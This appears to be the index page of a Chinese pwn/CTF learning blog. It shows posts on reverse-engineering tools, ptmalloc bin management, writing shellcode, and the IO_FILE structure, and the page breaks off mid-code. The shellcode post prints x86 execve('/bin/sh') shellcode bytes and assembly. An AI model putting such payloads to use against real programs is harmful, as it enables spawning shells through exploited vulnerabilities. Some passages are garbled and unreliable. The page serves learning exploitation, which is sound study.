<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Saku376&#39;s Pwn Sea</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="个人博客，分享网络安全特别是pwn">
<meta property="og:type" content="website">
<meta property="og:title" content="Saku376&#39;s Pwn Sea">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Saku376&#39;s Pwn Sea">
<meta property="og:description" content="个人博客，分享网络安全特别是pwn">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Saku376">
<meta property="article:tag" content="网络安全、二进制、pwn">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Saku376's Pwn Sea" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Saku376&#39;s Pwn Sea</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">技术是海，深不见底；生活是洋，广不着边；而我如浪花，清澈透明并且舞动双手，仰望天空。</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-二进制软件逆向分析工具及实战" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/" class="article-date">
  <time class="dt-published" datetime="2021-06-23T13:07:29.000Z" itemprop="datePublished">2021-06-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/">二进制软件逆向分析工具及实战</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p><img src="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/1.png" alt="1.png"><br><img src="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/2.png" alt="2.png"><br><img src="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/3.png" alt="3.png"><br><img src="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/4.png" alt="4.png"><br><img src="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/5.png" alt="5.png"><br><img src="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/6.png" alt="6.png"><br><img src="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/7.png" alt="7.png"><br><img src="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/8.png" alt="8.png"><br><img src="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/9.png" alt="9.png"><br><img src="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/10.png" alt="10.png"><br><img src="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/11.png" alt="11.png"><br><img src="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/12.png" alt="12.png"><br><img src="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/13.png" alt="13.png"><br><img src="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/14.png" alt="14.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/" data-id="ckqhlj4nb0000fku68xeh3d4r" data-title="二进制软件逆向分析工具及实战" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-二进制软件逆向分析基础" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/06/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/" class="article-date">
  <time class="dt-published" datetime="2021-06-22T12:32:58.000Z" itemprop="datePublished">2021-06-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/06/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/">二进制软件逆向分析基础</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p><img src="/2021/06/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/1.png" alt="1.png"><br><img src="/2021/06/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/2.png" alt="2.png"><br><img src="/2021/06/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/3.png" alt="3.png"><br><img src="/2021/06/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/4.png" alt="4.png"><br><img src="/2021/06/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/5.png" alt="5.png"><br><img src="/2021/06/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/6.png" alt="6.png"><br><img src="/2021/06/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/7.png" alt="7.png"><br><img src="/2021/06/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/8.png" alt="8.png"><br><img src="/2021/06/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/9.png" alt="9.png"><br><img src="/2021/06/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/10.png" alt="10.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/06/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/" data-id="ckqhkfhgc0000vwu63kq99ct2" data-title="二进制软件逆向分析基础" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-分箱式内存管理" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/06/20/%E5%88%86%E7%AE%B1%E5%BC%8F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/" class="article-date">
  <time class="dt-published" datetime="2021-06-20T22:50:33.000Z" itemprop="datePublished">2021-06-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/06/20/%E5%88%86%E7%AE%B1%E5%BC%8F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/">分箱式内存管理</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>对于空闲的chunk，ptmalloc采用分箱式的内存管理方式，根据空闲chunk的大小和处于的状态将其放在四个不同的bin中，这四个空闲chunk的容器包括fastbins，unsorted bin，small bins和large bins。fast bins是小内存块的高速缓存，当一些大小小于64字节的chunk被回收时，首先会放入fast bins中，在分配小内存时，首先会查看fast bins中是否有合适的内存块，如果存在，则直接返回fast bins中的内存块，以加快分配速度。Unszhiyouorted bin‪只有一个，回收的chunk块必须先放到unsorted bin中，分配内存时会查看unsorted bin 中是否偶合适的chunk，如果找到满足条件的chunk，则直接返回给用户，否则将unsorted bin的所有chunk放入small bins或是large bins的所有chunk放入small bins或是large bins中。small bins用于存放固定大小的chunk，共64个bin，最小的chunk大小为16字节或32字节，每个bin的大小相差8字节或是16字节，当分配小内存块时，采用精确匹配的方式从small bin中查找合适的chunk。Large bins用于存储大于等于512或1024B的空闲chunk，这些chunk使用双向链表的形式按大小顺序排序，分配内存时按最近匹配方式从large bins中分配chunk。</p>
<h1 id="Small-bins"><a href="#Small-bins" class="headerlink" title="Small bins"></a>Small bins</h1><p>ptmalloc使用small bins管理空闲小chunk，每个small bin中的chunk的大小与bin的index有如下关系：<br>Chunk_size=2<em>SIZE_SZ</em>index<br>在SIZE_SZ为4B的平台上，small bins中的chunk大小是以8B为公差的等差数列，最大的chunk大小为504B，最小的chunk大小为16B，所以实际共62个bin。分别为16B、24B、32B，……，504B。在SIZE_SZ为8B的平台上，small bins中的chunk大小是以16B为公差的等差数列，最大的chunk大小为1008B，最小的chunk大小为32B，所以实际共62个bin。分别为32B、48B、64B，……，1008B。<br>ptmalloc维护了62个双向环形链表（每个链表都具有链表头节点，加头结点的最大作用就是便于对链表内节点的统一处理，即简化编程），每一个链表内的各空闲chunk的大小一直，因此当应用程序需要分配某个字节大小的内存空间时直接在对应的链表内取就可以了，这样既可以很好的满足应用程序的内存空间申请请求而又不会出现太多的内存碎片。我们可以用下图来表示在SIZE_SZ位4B的平台上ptmalloc对512B字节一下的空闲chunk组织方式（所谓分箱机制）。</p>
<h1 id="Large-bins"><a href="#Large-bins" class="headerlink" title="Large bins"></a>Large bins</h1><h1 id="Unsorted-bin"><a href="#Unsorted-bin" class="headerlink" title="Unsorted bin"></a>Unsorted bin</h1><h1 id="Fast-bins"><a href="#Fast-bins" class="headerlink" title="Fast bins"></a>Fast bins</h1>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/06/20/%E5%88%86%E7%AE%B1%E5%BC%8F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/" data-id="ckq6r297c0000isu6f4qqgc2h" data-title="分箱式内存管理" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-PWN-shellcode编写" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/06/20/PWN-shellcode%E7%BC%96%E5%86%99/" class="article-date">
  <time class="dt-published" datetime="2021-06-20T12:00:24.000Z" itemprop="datePublished">2021-06-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/06/20/PWN-shellcode%E7%BC%96%E5%86%99/">PWN-Shellcode编写</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>当我们在获得程序的漏洞后，就可以在程序的漏洞处执行特定的代码，而这些代码也就是俗称的shellcode。</p>
<h1 id="一、获取集成写好的"><a href="#一、获取集成写好的" class="headerlink" title="一、获取集成写好的"></a>一、获取集成写好的</h1><h3 id="1、From-pwntools"><a href="#1、From-pwntools" class="headerlink" title="1、From pwntools"></a>1、From pwntools</h3><p>（1）先设置目标机的参数<br>context（os=”linux”，arch=”amd64”,log_level=’debug’）<br>log_level设置日志输出的等级debug，这样pwntools会将整个完整的io过程都打印下来，使得调试更加方便，可以避免在完成在完成CTF题目时出现一些和IO相关的错误。<br>（2）获取shellcode</p>
<p>1）获得执行system(“/bin/sh”)汇编代码所对应的机器码<br>asm(shellcraft.sh()）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>，arch=<span class="string">&#x27;i386&#x27;</span>，os=<span class="string">&#x27;linux&#x27;</span>）</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>
<p>2.利用别人写好的。如exploit-db<br>利用搜索引擎检索别人写好的可以直接来用的 shellcode。<br>sh对应的shellcode</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&quot;\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34&quot;</span></span><br></pre></td></tr></table></figure>
<h1 id="二、自己写"><a href="#二、自己写" class="headerlink" title="二、自己写"></a>二、自己写</h1><p>或者可以用msf生成，或者自己反编译一下。<br><img src="/2021/06/20/PWN-shellcode%E7%BC%96%E5%86%99/1.png" alt="1.png"><br>这里我们使用一段最简单的执行execve(“/bin/sh”)命令的语句作为shellcode。</p>
<p>以写一个execve(“/bin/sh”)为例子。<br>在当前位置执行“/bin/sh”，可以用execve(“/bin/sh”,0,0)<br>C语言利用代码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;unistd.h&gt;</span></span><br><span class="line">char *buf[]=&#123;<span class="string">&quot;/bin/sh&quot;</span>,NULL&#125;;</span><br><span class="line">void <span class="function"><span class="title">main</span></span>()&#123;</span><br><span class="line">     execve(<span class="string">&quot;/bin/sh&quot;</span>,buf,NULL);</span><br><span class="line">     <span class="built_in">exit</span>(0);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>execve()用来执行参数filename字符串所代表的文件路径，第二个参数利用指针数组来传递执行文件的参数，并且需要以空指针（NULL）结束，最后一个参数则为传递给执行文件的新环境变量数组。<br>execve()对应的中断向量表为：0x0b，对应eax</p>
<p>所以我们要做的就是写一个执行execve的汇编代码。</p>
<p>这里不得不提一下Int 0x80软中断调用。<br>第一步，就是需要将系统调用号加入到eax中。<br>第二步，ebx保存函数调用的第一个参数，ecx、edx、esi、edi分别对应这2345个参数。</p>
<p>如果参数超过5个，就必须将参数数组存储到内存中，而且必须将该数组的地址放在ebx中。<br>一旦加载寄存器后，就会调用int 0x80汇编指令来中断，强迫内核暂停手头上的工作并处理该中断。</p>
<p>故汇编代码的最后一步为<br>mov al,0xb<br>int 0x80<br>具体代码如下：<br>构造一个execve(“/bin/sh”,0,NULL)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">xor eax,eax //eax置零</span><br><span class="line">xor edx,edx //edx置零</span><br><span class="line">push edx</span><br><span class="line">push <span class="string">&quot;/sh&quot;</span></span><br><span class="line">push <span class="string">&quot;/bin&quot;</span> // 将/bin/sh入栈</span><br><span class="line">mov ebx,esp // ebx指向/bin/sh这个字符串</span><br><span class="line">xor ecx,ecx</span><br><span class="line">mov al,0bh  //eax置为execve函数的中断号</span><br><span class="line">int 80h  //调用软中断</span><br></pre></td></tr></table></figure>
<p>运用nasm -f elf32 文件名.asm<br>ld -m elf_i386 -o 文件名 文件名.o<br>objdump -o 文件名<br>获得汇编的机器码，如下<br><img src="/2021/06/20/PWN-shellcode%E7%BC%96%E5%86%99/2.png" alt="2.png"><br>我们可以看到上图画线处有\00，shellcode在使用时遇到\00会被截断，所以我们要避免出现\x00字节，我们知道00是出现在/bin/sh那里的，重新修改我们的汇编程序：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">xor eax,eax</span><br><span class="line">xor edx,edx</span><br><span class="line">push edx</span><br><span class="line">push <span class="string">&quot;//sh&quot;</span></span><br><span class="line">push <span class="string">&quot;/bin&quot;</span></span><br><span class="line">mov ebx,esp</span><br><span class="line">xor ecx,ecx</span><br><span class="line">mov al,0Bh</span><br><span class="line">int 80h</span><br></pre></td></tr></table></figure>
<p>在终端中”/bin/sh”和”/bin//sh”的效果是一样的。<br>执行后如下：<br><img src="/2021/06/20/PWN-shellcode%E7%BC%96%E5%86%99/3.png" alt="3.png"><br>所以shellcode就是</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode=<span class="string">&quot;\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80&quot;</span></span><br></pre></td></tr></table></figure>




      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/06/20/PWN-shellcode%E7%BC%96%E5%86%99/" data-id="ckq65rr200000c4u6c5eb5qnw" data-title="PWN-Shellcode编写" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-IO-FILE学习" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/06/19/IO-FILE%E5%AD%A6%E4%B9%A0/" class="article-date">
  <time class="dt-published" datetime="2021-06-20T00:07:02.000Z" itemprop="datePublished">2021-06-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/06/19/IO-FILE%E5%AD%A6%E4%B9%A0/">IO_FILE学习</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="FILE结构"><a href="#FILE结构" class="headerlink" title="FILE结构"></a>FILE结构</h1><p>FILE在linux系统的标准IO库中是用于描述文件结构的，成为文件流。FILE结构在程序fopen等函数时会进行创建，并分配在堆中。我们常定义一个指向FILE结构的指针来接收这个返回值。FILE结构定义在libc.h中，如下图所示</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>进程中的FILE结构会通过_chain域彼此连接形成一个链表，链表头部用全局变量_IO_list_all表示，通过这个值我们可以遍历所有结构。<br>在标准I/O库中，每个程序启动时会有三个文件流自动打开的：stdin、stdout、stderr。他们的结构指针分别是_IO_2_1_stderr。他们的结构指针分别是_IO_2_1_stderr_、IO_2_1_stdout、IO_2_1_stdin。<br>IO_2_1_stderr、IO_2_1_stdin_是_IO_FILE结构外包裹着另一种结构的_FILE_plus，其中包含了一个重要的指针vtable指向了一些列函数指针。<br>结构如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>IO_jump_t保存的一系列指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> * funcs[] = &#123;</span><br><span class="line">   <span class="number">1</span> <span class="literal">NULL</span>, <span class="comment">// &quot;extra word&quot;</span></span><br><span class="line">   <span class="number">2</span> <span class="literal">NULL</span>, <span class="comment">// DUMMY</span></span><br><span class="line">   <span class="number">3</span> <span class="built_in">exit</span>, <span class="comment">// finish</span></span><br><span class="line">   <span class="number">4</span> <span class="literal">NULL</span>, <span class="comment">// 